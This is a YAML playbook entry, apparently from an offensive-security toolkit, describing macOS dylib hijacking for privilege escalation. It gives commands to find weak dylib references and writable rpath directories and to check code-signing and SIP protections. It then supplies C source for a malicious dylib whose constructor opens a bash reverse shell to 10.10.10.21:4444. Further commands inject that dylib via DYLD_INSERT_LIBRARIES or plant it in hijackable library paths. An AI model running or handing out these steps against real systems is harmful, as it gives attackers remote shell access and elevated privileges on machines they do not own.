---
description: |
  Exploit dylib hijacking on macOS by identifying weak dylib references, injecting malicious dylibs via DYLD_INSERT_LIBRARIES, or placing dylibs in rpath search paths.
commands:
  - have: Shell
    cmd: |
      # ============================================================
      # ENUMERATION — Find hijackable dylib references
      # ============================================================

      # Find weak dylib references (LC_LOAD_WEAK_DYLIB) — missing = hijackable
      otool -L /path/to/binary | grep -i weak

      # Check rpath search paths (where the binary looks for @rpath dylibs)
      otool -l /path/to/binary | grep -A2 LC_RPATH

      # Find writable rpath directories
      otool -l /path/to/binary | grep -A2 LC_RPATH | grep path | awk '{print $2}' | while read d; do [ -w "$d" ] && echo "WRITABLE: $d"; done

      # Check if binary has restricted flag (blocks DYLD injection)
      codesign -d --flags /path/to/binary
      codesign -dvv /path/to/binary 2>&1 | grep -i restrict
      codesign -dvv /path/to/binary 2>&1 | grep -i runtime

      # Check SIP status (DYLD injection blocked for Apple binaries if SIP on)
      csrutil status

      # ============================================================
      # EXPLOIT 1: Create malicious dylib
      # ============================================================

      # evil.c — constructor function runs automatically when dylib loads
      # #include <stdlib.h>
      # __attribute__((constructor)) void init() {
      #     system("bash -i >& /dev/tcp/10.10.10.21/4444 0>&1");
      # }
      gcc -dynamiclib -o /tmp/evil.dylib evil.c

      # ============================================================
      # EXPLOIT 2: DYLD_INSERT_LIBRARIES injection
      # ============================================================

      # Only works on binaries WITHOUT hardened runtime or library validation
      DYLD_INSERT_LIBRARIES=/tmp/evil.dylib /path/to/vulnerable_binary

      # ============================================================
      # EXPLOIT 3: Rpath hijacking
      # ============================================================

      # If binary loads @rpath/lib.dylib and rpath includes a writable dir
      # Place malicious dylib at the writable rpath location
      cp /tmp/evil.dylib "/Users/sec_user/Library/Frameworks/lib.dylib"

      # ============================================================
      # EXPLOIT 4: Weak dylib hijacking
      # ============================================================

      # If binary has LC_LOAD_WEAK_DYLIB pointing to a missing dylib
      # Place your malicious dylib at that exact path
      cp /tmp/evil.dylib "/opt/missing/lib.dylib"
phase:
  - PrivEsc
target_os:
  - macOS
services: []
techniques:
  - Dylib_Hijack
references:
  - https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation/macos-dyld-hijacking-and-dyld_insert_libraries
---
